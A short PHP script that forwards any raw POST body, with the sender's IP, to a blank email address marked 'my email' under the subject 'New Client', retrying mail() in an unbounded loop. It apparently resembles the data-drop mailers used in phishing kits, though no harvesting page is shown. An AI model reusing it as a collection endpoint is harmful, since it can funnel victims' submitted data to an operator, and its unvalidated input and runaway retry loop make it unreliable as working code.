
<?php 
$ip = $_SERVER['REMOTE_ADDR'];
$message =file_get_contents('php://input');
$from ="Client From " .$ip;
$send= "";//my email
$subject = "New Client";
$headers = "Order ". $from;

while(mail($send,$subject,$message,$headers) != true)
{
mail($send,$subject,$message,$headers);
}

exit 
?>

